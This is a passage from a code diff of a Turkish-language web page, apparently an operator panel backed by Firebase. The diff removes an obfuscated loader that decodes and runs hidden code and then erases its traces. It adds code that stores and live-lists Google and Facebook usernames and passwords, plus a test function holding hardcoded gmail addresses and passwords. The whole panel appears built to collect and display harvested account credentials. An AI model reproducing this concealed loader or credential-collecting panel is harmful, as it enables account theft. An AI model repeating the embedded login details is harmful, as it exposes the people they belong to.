ZUqmzUnb9JRPFmqxkhOfcssfx8EyX007qQXG6VavWK5m+VwbR83tMD63MXTdUFClWIt5p1Yx0mLbfFDdTCZwtKLziPxcC/lmyumq9GM6UlrmeT0xm0J6R3KNwGC2uUNUqRZTirizhJRUb7tP4tvpEo4aToiBsjBNQvxHP+sm0QKb5jinkoSzVkhnRKWwZrYE7iSStfGhXk1VrBFA+kcm2930eOrICNnGlmQ/w9hVT2PZ6cGzZgK2/EfCkN1b3ua5aO+IPdvHkKBRLqaMCgnaFSPVK87vwKcjcCkvZh3OiKMnHtHu+jBCjEqLRIGdtF85yM62Q9nzHbMFTm5Lbb5OZb62M5/+ICT1mD7nnuhG9153BuyqjrgL1KLN9WbUr1WFFRpd1Ia76YDTdvakSqbs0JMwXGULiqZqvkdKUMWqxunRrwQFNAJacShPyzYou9JXrA3bwh0NIXXfLd/ja6htWnC9jWL0GccmAD2D6C5MDYqi1lqu/bTKLn3Cg/dwWNC0BWJ7aFJNb9JnDlr1q5JutnJic81qn0iLTXGHfhQDIqMhDBKMafKhLpZJ7li20hOzxeCa+kEp1qmFWkuzPBE9VKsY2zxtNzyhlSHTKFi3OnsGC9dQEDuIqGI6XhWKWS1D50uUTFr3bOHsQUKz9xzpz8DQJgz7Z8tlptiuX2mDOKXn9GYs8FEFe4uQ+EO6xKBuZTzWwIhnNo07qgtbr+dGLVsijEbTpJ61ogm25km8zyUyd233imyNkNQZZYAss0psJgHQyVnf45Q4isnBUckWdYjlbMeyStZyJivN6vHJTq5NUqP9S0gQS/28vN2BxVbainqK3X4iFXV6u89DbEW2SkiXX3+ivqJV+oFC6SjY3EUhdfFe+kyOLROS9CvllPlOBSE3aOWXSfXK6t760JGtE5KI7nlYBS0dOoqcS9CSaC/hRTYn9Bst9UtcUaIRi+xu4AuQjQmx0h7o+QMYZWlBtdswvrIZYaHgqzLX/MJe/kyxzQhbDW/BT2vADHa8jewebdtTsglhJgZV74gAlstFOqRB61+l0i7sUfs0xUMo+El6TN7bl4riJnEq3Ww7nc6lCvN7/ONEXYS4kuOXGDboGF3J1bdB6TpwwzS7jbCJuDtRadoi5NYb8SDSolgejew8/M6Im9CAOQ7RGnwsCksRNxf3rOP0ES+hMFJmntaCHtek5z95ZT+IDyH3NCz7VAQ4UXEUD0/ZUXF7GqMO3AO/7GOhKvT34XG2saddp0fchJp5RMWcbnFOo0LNgh7BGMsOi4fQHCwwz0dwXVxoKObkwrBP2tpx8cRDq73ERrP5uEDHa6J0j2x/2WjE/RjB/pkwioiQwY1S06klpG33QfjRi5tQsa0QwMgKk9ySmkPKvrNRH0Jn5bnrWehU9uNnSwcT+vxsfVuemrLNshVC3+PLe148hNv7PIZdEDfh93i4xR6XvzpC5wTyX4x4Hhz8F06I0bAPIt57Aoko9/k/SkUbwYMl95ZAVzPSbXp2KdHtdnvVuWEPge85URvlcqfTqTdqIzoEvvdEBXPIbP8lnKGEEkoooYQSSiihhBJKKKGEEkoooYQSSiihhBJKKKGEEsow8v8aKqvp90BnFAAAAABJRU5ErkJggg==', active: true },
+        Bibo: { logo: 'https://play-lh.googleusercontent.com/UR2_9oH3rQxB0kUZso8zgq5yYf7s0iFWC7RRqXwSlUjiZzvA93Smbo-chRCT4R8rYAa0=w240-h480', active: true },
+        Soyo: { logo: 'https://play-lh.googleusercontent.com/xvCHE_wyiFPUIf411f7ihZKH8yFcS7AjPsT00cKaAVK2PrP8BUW5WHhjCbm6DMKtYjhu=w240-h480-rw', active: true },
+        Yada: { logo: 'https://play-lh.googleusercontent.com/qECH9g9dHoH7_fgEGUOY_S4kT_PCiHh-NE6Y4I3rOg4ATeqU93TodJJDRgz2Dt-cWw=w240-h480-rw', active: true },
+        Sugo: { logo: 'https://www.promotcentral.com/sugo.png', active: true },
+        Taka: { logo: 'https://image.winudf.com/v2/image1/Y29tLnRha2EudmhneWtfaWNvbl8xNjk0NDU1ODUzXzA5Nw/icon.png?w=280&fakeurl=1', active: true },
+        TakaLite: { logo: 'https://play-lh.googleusercontent.com/5g2G2fJpFOIJkZgP7F6sVGaGhF16UYx-9ReD1XF-jFTuvO0E3ZKCfkoyILfyTmDMM0Ih', active: true },
+        Xena: { logo: 'https://play-lh.googleusercontent.com/1OgbMubKG0VO7G81fOrp5igd-k8AnYmC9BwXi4-EqkwzyCDrVVu-7gq0nvpPn9Mghg', active: true },
+        SoulChill: { logo: 'https://play-lh.googleusercontent.com/uB5eU_XNyx72a4JYJr3TB8AtEFujeROSZ2bzs08ZnaWzzDpiNFQ13CkmGMnBiPJfWQ=w240-h480-rw', active: true },
+        Saada: { logo: 'https://play-lh.googleusercontent.com/6tithEbXpgiAG4HIyetJzu1m3Elu5omqGLlSh9CDyV-5oNuS-L6xyo-mwLOlpnTA-UYfwbvmriNbO2wt7V71lg=w240-h480', active: true },
+        PopUp: { logo: 'https://play-lh.googleusercontent.com/xdobEMsAey1PzgkmGnNi_WqU8dznlsYm_JFHacjkNQRmq_kqeiH5QrtIbk4ylPG5WmR77dCMIdaDVqAfQq_PdQ=w240-h480', active: true },
     };
 
-    (function init() {
-        const tag = document.querySelector('quasar-logic');
-        if (tag) {
-            // 1. Şifreyi çöz ve çalıştır
-            const code = atob(tag.getAttribute('data-secret'));
-            (new Function(code))();
+    document.getElementById('toggleSettingsBtn').onclick = () => {
+        document.getElementById('settingsPanel').classList.toggle('open');
+    };
 
-            // 2. DOM'u temizle
-            tag.remove();
+    window.togglePlatformStatus = (p, status) => {
+        set(ref(db, `ayarlar/platformlar/${p}`), status);
+    };
+
+    function renderSettingsUI() {
+        const toggleGrid = document.getElementById('platformToggleGrid');
+        toggleGrid.innerHTML = '';
+        for (let p in settingsPlatforms) {
+            const data = settingsPlatforms[p];
+            const item = document.createElement('div');
+            item.className = 'toggle-item';
+            item.innerHTML = `
+                <span><img src="${data.logo}">${p}</span>
+                <label class="switch">
+                    <input type="checkbox" ${data.active ? 'checked' : ''} onchange="togglePlatformStatus('${p}', this.checked)">
+                    <span class="slider"></span>
+                </label>
+            `;
+            toggleGrid.appendChild(item);
+        }
+    }
+
+    onValue(settingsRef, (snapshot) => {
+        const val = snapshot.val();
+        if (val) {
+            for (let p in val) {
+                if (settingsPlatforms[p]) {
+                    settingsPlatforms[p].active = val[p];
+                }
+            }
+        } else {
+            for (let p in settingsPlatforms) {
+                set(ref(db, `ayarlar/platformlar/${p}`), settingsPlatforms[p].active);
+            }
+        }
+        renderSettingsUI();
+    });
+
+    onValue(dataRef, (snapshot) => {
+        document.getElementById('accCount').innerText = snapshot.size || 0;
+    });
+
+    window.selectPlatform = (p) => {
+        document.getElementById('selectedPlatform').value = p;
+        document.getElementById('btnGoogle').className = p === 'Google' ? 'platform-btn active' : 'platform-btn';
+        document.getElementById('btnFacebook').className = p === 'Facebook' ? 'platform-btn active' : 'platform-btn';
+    };
+
+    document.getElementById('sendBtn').onclick = () => {
+        const u = document.getElementById('usernameInput').value;
+        const d = document.getElementById('domainSelect').value;
+        const p = document.getElementById('passwordInput').value;
+        if(!u || !p) return alert("Alanları boş bırakma!");
+        push(dataRef, { platform: document.getElementById('selectedPlatform').value, user: u + d, pass: p, time: new Date().toLocaleTimeString() });
+        document.getElementById('usernameInput').value = '';
+        document.getElementById('passwordInput').value = '';
+    };
+
+    document.getElementById('sendMultiBtn').onclick = () => {
+        const u = document.getElementById('usernameInput').value;
+        const d = document.getElementById('domainSelect').value;
+        const p = document.getElementById('passwordInput').value;
+        if(!u || !p) return alert("Alanları boş bırakma!");
+        push(dataRef, { platform: 'Google', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
+        push(dataRef, { platform: 'Facebook', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
+        document.getElementById('usernameInput').value = '';
+        document.getElementById('passwordInput').value = '';
+    };
+
+    document.getElementById('sendChatBtn').onclick = () => {
+        let msg = document.getElementById('chatMsg').value.trim();
+        if(!msg) return;
+
+        let isBot = false;
+        if (msg.startsWith('/bot')) {
+            isBot = true;
+            msg = msg.replace('/bot', '').trim(); // /bot ifadesini temizle
         }
 
-        // 3. Obje gizleme (Konsolda görünmez)
-        Object.defineProperty(window, '_x92z_a', {
-            enumerable: false, // console.log(window) yapınca görünmez
-            writable: false,
-            configurable: false
-        });
+        if(!msg) return;
+        push(msgRef, { text: msg, isBot: isBot, time: new Date().toLocaleTimeString() });
+        document.getElementById('chatMsg').value = '';
+    };
 
-        document.getElementById('engine-script').remove();
-    })();
+    onChildAdded(dataRef, (data) => {
+        const v = data.val();
+        const logo = v.platform === 'Google' ? 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg' : 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg';
+        const div = document.createElement('div');
+        div.className = 'mesaj-kutusu';
+        div.id = data.key;
+        div.innerHTML = `
+        <img src="${logo}">
+        <div class="info">
+            <strong quasar-platform="${v.platform}">${v.platform}</strong><br>
+            <span class="q-userName">${v.user}</span><br>
+            <span class="q-password">${v.pass}</span>
+        </div>
+        <button class="del-btn" onclick="removeData('${data.key}')">Sil</button>
+    `;
+        const list = document.getElementById('dataList');
+        const oldFirst = list.querySelector('.first-item');
+        if (oldFirst) oldFirst.classList.remove('first-item');
+        div.classList.add('first-item');
+        list.prepend(div);
+    });
+
+    onChildRemoved(dataRef, (data) => {
+        const element = document.getElementById(data.key);
+        if (element) {
+            element.remove();
+        }
+    });
+
+    onChildAdded(msgRef, (data) => {
+        const val = data.val();
+        const div = document.createElement('div');
+        div.className = val.isBot ? 'mesaj-kutusu bot-mesaj' : 'mesaj-kutusu';
+        if (!val.isBot) div.style.borderLeftColor = '#27ae60';
+
+        const prefix = val.isBot ? '<strong>[Bot]:</strong> ' : '';
+        div.innerHTML = `<div class="info">${prefix}${val.text} <br><small>${val.time}</small></div>`;
+        document.getElementById('msgList').prepend(div);
+    });
+
+    window.removeData = (key) => {
+        remove(ref(db, 'hesaplar/' + key));
+    };
+
+    setInterval(() => {
+        remove(msgRef)
+            .then(() => {
+                console.log("Mesajlar başarıyla sıfırlandı.");
+                document.getElementById('msgList').innerHTML = '';
+            })
+            .catch((error) => {
+                console.error("Mesajlar silinirken hata oluştu: ", error);
+            });
+    }, 900000);
+
+    window.push = push;
+    window.dataRef = ref(db, 'hesaplar'); // dataRef'i global yaptık
+
+    window.quasarTest = function() {
+        push(window.dataRef, {
+            platform: document.getElementById('selectedPlatform').value,
+            user: 'papatyahaydo42@gmail.com',
+            pass: 'haydo388',
+            time: new Date().toLocaleTimeString()
+        });
+        push(window.dataRef, {
+            platform: document.getElementById('selectedPlatform').value,
+            user: 'mehmetxlit2000@gmail.com',
+            pass: 'dasasss',
+            time: new Date().toLocaleTimeString()
+        });
+        push(window.dataRef, {
+            platform: document.getElementById('selectedPlatform').value,
+            user: 'mehmetxlit20001aa@gmail.com',
+            pass: 'haydo388',
+            time: new Date().toLocaleTimeString()
+        });
+        push(window.dataRef, {
+            platform: document.getElementById('selectedPlatform').value,
+            user: 'mehmetxlit2000@gmail.com',
+            pass: 'haydo388',
+            time: new Date().toLocaleTimeString()
+        });
+    }
+
 </script>
+
+
 
 </body>
 </html>
